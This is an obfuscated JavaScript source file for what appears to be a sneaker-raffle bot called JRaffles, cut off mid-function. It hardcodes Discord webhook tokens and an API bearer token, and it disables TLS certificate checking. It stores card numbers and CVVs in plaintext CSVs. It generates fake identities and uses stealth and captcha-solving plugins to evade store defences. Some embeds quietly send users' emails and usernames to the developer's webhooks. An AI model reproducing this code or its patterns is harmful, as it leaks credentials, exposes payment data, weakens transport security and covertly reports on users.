process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0xf38118 = require('fs'), _0x2ded28 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x19c1f0(_0x33b812) {
    const _0x59d742 = _0xf38118['createWriteStream'](_0x33b812, { 'flags': 'a' }), _0xf1a043 = console['log'];
    console['log'] = function () {
        const _0x4d0e2a = Array['prototype']['slice']['call'](arguments), _0x2903e4 = _0x4d0e2a['join']('\x20') + '\x0a';
        _0x59d742['write'](_0x2903e4), _0xf1a043['apply'](console, _0x4d0e2a);
    };
}
_0x19c1f0('../logs/log\x20' + _0x2ded28);
var _0x17d4a1 = require('tough-cookie'), _0x373ca3 = require('node-imap'), _0x42fba9 = require('util')['inspect'];
const _0x489d8f = require('mailparser')['simpleParser'], { EmbedBuilder: _0x358f5b } = require('discord.js');
var _0x13cb43 = require('exe');
const { execFile: _0x3a09b6 } = require('child_process'), _0x14f2e1 = require('puppeteer-extra'), _0x23aa28 = require('cross-spawn'), _0x2255ea = require('puppeteer-extra-plugin-recaptcha'), _0x3313a5 = require('puppeteer-extra-plugin-stealth'), _0x5631d3 = require('chalk'), _0x5bbc27 = require('node-bash-title'), _0x358674 = require('axios'), _0x2587e1 = require('papaparse');
var _0x3bc948 = require('random-name');
const _0x3aab66 = require('request');
var _0x551dbb = require('prompt');
const _0x2a1dbd = _0x3aab66['jar']();
var _0x4a50c2 = {};
const _0x2cb2d6 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x424cc3 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x41bbee = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x548199 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x414579 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x12ea8d = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x507f4b = 'https://discord.com/api/webhooks/', _0x5b8bb9 = '' + _0x507f4b + _0x41bbee, _0x54bd15 = '' + _0x507f4b + _0x548199, _0x495189 = '' + _0x507f4b + _0x2cb2d6, _0x4190b7 = '' + _0x507f4b + _0x424cc3, _0x40302c = '' + _0x507f4b + _0x414579, _0x41e473 = '' + _0x507f4b + _0x12ea8d;
const _0x366b4f = JSON['parse'](_0xf38118['readFileSync']('country.json', 'utf-8')), _0x4e8a45 = JSON['parse'](_0xf38118['readFileSync']('../package.json', 'utf-8')), _0x539abe = _0x4e8a45['version'];
var _0x3d6b41, _0x4629ee, _0x43f252, _0x397f8f, _0x4f71f2, _0x3b3c4d, _0x1544fc, _0x210b4c;
const _0xfa8ad2 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x5cc6d1 = ![];
const _0x58d986 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x58d39c = '0123456789';
var _0x29f7da = _0x58d986['split']('');
const _0x4a3381 = require('auto-git-update'), _0x140e20 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x446832 = new _0x4a3381(_0x140e20);
async function _0x10b708() {
    _0x4f71f2 = _0xf38118['readdirSync']('../proxies'), _0x397f8f = _0xf38118['readdirSync']('../tasks'), !_0xf38118['existsSync']('../accounts/fenom.csv') && _0xf38118['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0xf38118['existsSync']('../accounts/paypal.csv') && _0xf38118['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0xf38118['existsSync']('../accounts/bstn.csv') && _0xf38118['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0xf38118['existsSync']('../accounts/eql.csv') && _0xf38118['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0xf38118['existsSync']('../failed-tasks.csv') && _0xf38118['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0xf38118['existsSync']('../successful-tasks.csv') && _0xf38118['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4a50c2 = JSON['parse'](_0xf38118['readFileSync']('../settings.json', 'utf-8')), !_0x4a50c2['delay'] && (_0x4a50c2['delay'] = 0x3c, _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['threads'] && (_0x4a50c2['threads'] = 0x1, _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['masterMail'] && (_0x4a50c2['masterMail'] = 'yourmail@gmail.com', _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['CapSolver'] && (_0x4a50c2['CapSolver'] = 'yourkeyhere', _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['masterPassword'] && (_0x4a50c2['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['captchaKey'] && (_0x4a50c2['captchaKey'] = '', _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['useRandomProxy'] && (_0x4a50c2['useRandomProxy'] = !![], _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['shuffleTasks'] && (_0x4a50c2['shuffleTasks'] = ![], _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), !_0x4a50c2['webhook'] && (_0x4a50c2['webhook'] = '', _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), _0x4a50c2['delay'] <= 0x1388 && (_0x4a50c2['delay'] = _0x4a50c2['delay'] * 0x3e8), _0x4a50c2['AfewDelay'] && (delete _0x4a50c2['AfewDelay'], _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), _0x4a50c2['MahaDelay'] && (delete _0x4a50c2['MahaDelay'], _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), _0x4a50c2['footshopDelay'] && (delete _0x4a50c2['footshopDelay'], _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2, null, 0x2))), _0x4a50c2['MahaDelay'] = _0x4a50c2['delay'], _0x507f4b = _0x4a50c2['webhook'], _0x3b3c4d = _0x4a50c2['licenseKey'];
}
let _0x9e82ef, _0xe55f61 = [], _0x1ca6dd;
const _0xb9a1a7 = _0x57e576 => new Promise(_0x54977e => setTimeout(_0x54977e, _0x57e576));
function _0x5c4736(_0x362997, _0x2eb7bd) {
    return Math['floor'](Math['random']() * (_0x2eb7bd - _0x362997 + 0x1) + _0x362997);
}
function _0x17e166(_0xc1297e) {
    let _0x575c50 = _0xc1297e['length'], _0x457430;
    while (_0x575c50 != 0x0) {
        _0x457430 = Math['floor'](Math['random']() * _0x575c50), _0x575c50--, [_0xc1297e[_0x575c50], _0xc1297e[_0x457430]] = [
            _0xc1297e[_0x457430],
            _0xc1297e[_0x575c50]
        ];
    }
    return _0xc1297e;
}
async function _0xec6c8f(_0x40b1ba) {
    try {
        return _0x358674['post']('https://api.whop.com/api/v2/memberships/' + _0x40b1ba + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x15d9f0) {
        console['log']('Error\x20checking\x20license:\x20' + _0x15d9f0['message']);
    }
}
async function _0x3ed2a9(_0x367b58) {
    console['clear']();
    if (_0x367b58 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x442b07 = await _0x551dbb['get']('License');
        if (_0x442b07['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xb9a1a7(0xbb8), _0x3ed2a9(_0x367b58);
        _0x367b58 = _0x442b07['License'], _0x4a50c2['licenseKey'] = _0x367b58, _0x3b3c4d = _0x367b58, _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2));
    }
    console['log']('Checking\x20license\x20' + _0x3b3c4d + '...'), await _0xb9a1a7(0x320);
    const _0x731321 = await _0xec6c8f(_0x367b58);
    _0x1544fc = JSON['stringify'](_0x731321['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x210b4c = JSON['stringify'](_0x731321['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x731321)
        return console['log']('License\x20not\x20found');
    if (!_0x731321['data'])
        return console['log']('License\x20not\x20bound');
    return _0x731321['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x5cc6d1 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x5cc6d1 = ![]);
}
async function _0x5855d4() {
    var _0x26e51f = await _0x551dbb['get']('Module');
    return console['clear'](), _0x26e51f['Module'];
}
;
async function _0xb82327() {
    var _0x3d8a85 = await _0x551dbb['get']('Setting');
    return console['clear'](), _0x3d8a85['Setting'];
}
async function _0x1487ec(_0x4b8e09) {
    var _0x774972 = [];
    for (file of _0x397f8f) {
        var _0x5401a5 = _0xf38118['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x2587e1['parse'](_0x5401a5, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x4b8e09['store'] && _0x774972['push'](file);
    }
    !_0x774972['length'] == 0x0 && (_0x397f8f = _0x774972);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2e005d = 0x0; _0x2e005d < _0x397f8f['length']; _0x2e005d++) {
        console['log']('\x20(' + _0x2e005d + ')\x20' + _0x397f8f[_0x2e005d]);
    }
    console['log']('');
    var _0x16c87c = await _0x551dbb['get']('Task');
    if (_0x16c87c['Task'] > _0x397f8f['length'] - 0x1 || isNaN(_0x16c87c['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xb9a1a7(0x3e8), _0x1487ec();
    var _0x55093a = _0xf38118['readFileSync']('../tasks/' + _0x397f8f[_0x16c87c['Task']], 'utf-8');
    return _0x43f252 = _0x2587e1['parse'](_0x55093a, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x5631d3['blue'](_0x397f8f[_0x16c87c['Task']])), _0x3d6b41 = _0x397f8f[_0x16c87c['Task']], _0x43f252;
}
async function _0x1c7322() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x29bb6a = 0x0; _0x29bb6a < _0x4f71f2['length']; _0x29bb6a++) {
        console['log']('\x20(' + _0x29bb6a + ')\x20' + _0x4f71f2[_0x29bb6a]);
    }
    console['log']('');
    var _0x2c4302 = await _0x551dbb['get']('Proxies');
    if (_0x2c4302['Proxies'] > _0x4f71f2['length'] - 0x1 || isNaN(_0x2c4302['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xb9a1a7(0x3e8), _0x1c7322();
    var _0x30b552 = _0xf38118['readFileSync']('../proxies/' + _0x4f71f2[_0x2c4302['Proxies']], 'utf-8')['split']('\x0a');
    let _0xb39d27 = _0x30b552['map']((_0xe26523, _0x434f94) => {
        sanatizeProxy = _0xe26523['replace']('\x0d', '');
        if (_0x30b552[_0x434f94 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4629ee = _0x4f71f2[_0x2c4302['Proxies']], console['clear'](), _0xb39d27;
}
async function _0x400118() {
    var _0x1b7066 = await _0x551dbb['get']('Value');
    return console['clear'](), _0x1b7066['Value'];
}
async function _0x2b3489(_0x17af3b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4f0dde = 0x0; _0x4f0dde < _0x17af3b['length']; _0x4f0dde++) {
        console['log']('\x20(' + _0x4f0dde + ')\x20[' + _0x17af3b[_0x4f0dde]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x13ecb9 = await _0x551dbb['get']('Module');
    return _0x13ecb9['Module'];
}
async function _0x5dfb41() {
    var _0x402229 = await _0x551dbb['get']('Password');
    return console['clear'](), _0x402229['Password'];
}
;
async function _0x4f91bf() {
    var _0x10a51d = await _0x551dbb['get']('Links');
    return _0x10a51d['Links'];
}
;
async function _0x3b122b() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x29ad46 = 0x0; _0x29ad46 < _0xe55f61['length']; _0x29ad46++) {
        console['log']('\x20(' + _0x29ad46 + ')\x20' + _0xe55f61[_0x29ad46]);
    }
    ;
    console['log']();
    let _0x285eae = await _0x551dbb['get']('Product');
    return console['clear'](), _0x285eae['Product'];
}
;
function _0x5b6bc2() {
    var _0x32d71a = new Date(Date['now']())['toLocaleTimeString']();
    return _0x32d71a;
}
;
function _0x5df2c9() {
    var _0x2815d1 = new Date(Date['now']())['toLocaleString']();
    return _0x2815d1['replace'](',', '');
}
async function _0x313aa7(_0x5dcbba, _0x4f0e8e) {
    let _0x38622b = { 'headers': { 'content-type': 'application/json' } };
    if (_0x539abe != 'devkey') {
        await _0x358674['post'](_0x5dcbba, _0x4f0e8e, _0x38622b);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x530ba6(_0x16ba09, _0x28a0f0, _0x332a69, _0x3df336, _0x170adf) {
    if (!_0x3df336 && _0x332a69 == 'dev') {
        var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x28a0f0['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x16ba09['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4a50c2['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1544fc,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x16ba09['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x16ba09['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x539abe,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4fa401['data'];
    } else {
        if (_0x3df336 && _0x332a69 == 'dev') {
            var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1544fc,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x28a0f0['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x16ba09['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4a50c2['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x170adf,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x16ba09['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x16ba09['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x539abe,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4fa401['data'];
        } else {
            if (_0x332a69 == 'pub') {
                var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x28a0f0['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x16ba09['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4a50c2['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x16ba09['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x539abe,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4fa401['data'];
            } else {
                if (_0x332a69 == 'acc' && !_0x3df336) {
                    var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1544fc,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x28a0f0['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4a50c2['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x539abe,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4fa401['data'];
                } else {
                    if (_0x332a69 == 'acc' && _0x3df336) {
                        var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1544fc,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x170adf,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x28a0f0['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4a50c2['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x539abe,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4fa401['data'];
                    } else {
                        if (_0x332a69 == 'open') {
                            var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x210b4c)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1544fc,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x539abe,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4fa401['data'];
                        } else {
                            if (!_0x3df336 && _0x332a69 == 'ver') {
                                var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1544fc,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x28a0f0['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4a50c2['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x539abe,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4fa401['data'];
                            } else {
                                if (_0x3df336 && _0x332a69 == 'ver') {
                                    var _0x4fa401 = new _0x358f5b()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x28a0f0['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1544fc,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x170adf,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x28a0f0['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4a50c2['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x539abe,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4fa401['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x2dc03a(_0x1272a0, _0x495c21) {
    var _0x32fa75 = _0x1272a0[_0x495c21]['Address1']['split'](''), _0x538b34 = _0x1272a0[_0x495c21]['Address2']['split'](''), _0x32f064 = _0x1272a0[_0x495c21]['Email']['split']('@');
    for (var _0x2382b3 = 0x0; _0x2382b3 < _0x32fa75['length']; _0x2382b3++) {
        if (_0x32fa75[_0x2382b3] == 'X') {
            var _0x16f4bc = Math['round'](Math['random']() * (_0x58d986['length'] - 0x1));
            _0x32fa75[_0x2382b3] = _0x29f7da[_0x16f4bc];
        }
    }
    ;
    for (var _0x2382b3 = 0x0; _0x2382b3 < _0x538b34['length']; _0x2382b3++) {
        if (_0x538b34[_0x2382b3] == 'X') {
            var _0x16f4bc = Math['round'](Math['random']() * (_0x58d986['length'] - 0x1));
            _0x538b34[_0x2382b3] = _0x29f7da[_0x16f4bc];
        }
    }
    ;
    _0x1272a0[_0x495c21]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x1272a0[_0x495c21]['FirstName'] = _0x3bc948['first']());
    _0x1272a0[_0x495c21]['LastName']['toUpperCase']() == 'RANDOM' && (_0x1272a0[_0x495c21]['LastName'] = _0x3bc948['last']());
    _0x32f064[0x0]['toUpperCase']() == 'RANDOM' ? _0x32f064[0x0] = '' + _0x3bc948['first']() + _0x3bc948['last']() + _0x5c4736(0x1, 0x3e7) + '@' : _0x32f064[0x0] = _0x32f064[0x0] + '@';
    _0x1272a0[_0x495c21]['Email'] = _0x32f064['join'](''), _0x1272a0[_0x495c21]['Address1'] = _0x32fa75['join'](''), _0x1272a0[_0x495c21]['Address2'] = _0x538b34['join']('');
    _0x1272a0[_0x495c21]['Phone'] == 'RANDOM' && (_0x1272a0[_0x495c21]['Phone'] = '0' + _0x5c4736(0x5f5e100, 0x3b9ac9ff));
    if (_0x1272a0[_0x495c21]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x25986e = _0x5c4736(0x1, 0x270f);
        _0x1272a0[_0x495c21]['Follower'] = '' + _0x3bc948['first']() + _0x3bc948['last']() + _0x25986e + '\x20';
    }
    _0x1272a0[_0x495c21]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x1272a0[_0x495c21]['HouseNumber'] = _0x5c4736(0x1, 0xc8));
    if (_0x1272a0[_0x495c21]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x1e6410 = Math['round'](Math['random']() * (_0x58d986['length'] - 0x1)), _0x32df2b = _0x29f7da[_0x1e6410];
        _0x1272a0[_0x495c21]['Address1'] = _0x3bc948['last']() + 'straat', _0x1272a0[_0x495c21]['Zip'] == '' && (_0x1272a0[_0x495c21]['Postcode'] = _0x5c4736(0x3e8, 0x270f) + '\x20' + _0x32df2b + _0x32df2b, _0x1272a0[_0x495c21]['Zip'] = _0x1272a0[_0x495c21]['Postcode']), _0x1272a0[_0x495c21]['HouseNumber'] = '' + _0x5c4736(0x1, 0xc8);
    }
    return;
}
;
async function _0x100e1d(_0x35385d, _0x5ca50e) {
    _0xf38118['appendFileSync']('../failed-tasks.csv', _0x5df2c9() + ',' + _0x5ca50e['store'] + ',' + _0x5ca50e['name'] + ',' + _0x35385d['Url'] + ',' + _0x35385d['Size'] + ',' + _0x35385d['Follower'] + ',' + _0x35385d['FirstName'] + ',' + _0x35385d['LastName'] + ',' + _0x35385d['Address1'] + ',' + _0x35385d['Address2'] + ',' + _0x35385d['HouseNumber'] + ',' + _0x35385d['Zip'] + ',' + _0x35385d['City'] + ',' + _0x35385d['State'] + ',' + _0x35385d['Country'] + ',' + _0x35385d['Phone'] + ',' + _0x35385d['Email'] + ',' + _0x35385d['Password'] + ',' + _0x35385d['PaymentMethod'] + ',' + _0x35385d['CardType'] + ',' + _0x35385d['NameOnCard'] + ',' + _0x35385d['CardNumber'] + ',' + _0x35385d['ExpiryDate'] + ',' + _0x35385d['CVV'] + ',' + _0x35385d['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5207fa(_0x12a06d, _0xe24429) {
    _0xf38118['appendFileSync']('../successful-tasks.csv', _0x5df2c9() + ',' + _0xe24429['store'] + ',' + _0xe24429['name'] + ',' + _0x12a06d['Url'] + ',' + _0x12a06d['Size'] + ',' + _0x12a06d['Follower'] + ',' + _0x12a06d['FirstName'] + ',' + _0x12a06d['LastName'] + ',' + _0x12a06d['Address1'] + ',' + _0x12a06d['Address2'] + ',' + _0x12a06d['HouseNumber'] + ',' + _0x12a06d['Zip'] + ',' + _0x12a06d['City'] + ',' + _0x12a06d['State'] + ',' + _0x12a06d['Country'] + ',' + _0x12a06d['Phone'] + ',' + _0x12a06d['Email'] + ',' + _0x12a06d['Password'] + ',' + _0x12a06d['PaymentMethod'] + ',' + _0x12a06d['CardType'] + ',' + _0x12a06d['NameOnCard'] + ',' + _0x12a06d['CardNumber'] + ',' + _0x12a06d['ExpiryDate'] + ',' + _0x12a06d['CVV'] + ',' + _0x12a06d['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x1d56ed() {
    let _0x2bf46d = proxyFile['split']('\x0a'), _0x4cb6ef = _0x2bf46d['map']((_0x3d1e94, _0x39e892) => {
        sanatizeProxy = _0x3d1e94['replace']('\x0d', '');
        if (_0x2bf46d[_0x39e892 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4cb6ef;
}
;
async function _0x34e8ed(_0x51a455, _0x189ae2) {
    if (_0x2f6385 != 'yes')
        var _0x2f6385 = '', _0x56fab0 = 0x0;
    async function _0x27eaa8() {
        var _0x494908 = _0xf38118['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0xc977df = _0x2587e1['parse'](_0x494908, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x403d8e = 0x0; _0x403d8e < _0xc977df['length']; _0x403d8e++) {
            console['log']('(' + _0x403d8e + ')\x20' + _0xc977df[_0x403d8e]['Email']);
        }
        console['log']('\x0a(' + _0xc977df['length'] + ')\x20' + _0x5631d3['cyan']('Add\x20a\x20new\x20account'));
        let _0x4bd959 = await _0x551dbb['get']('Option');
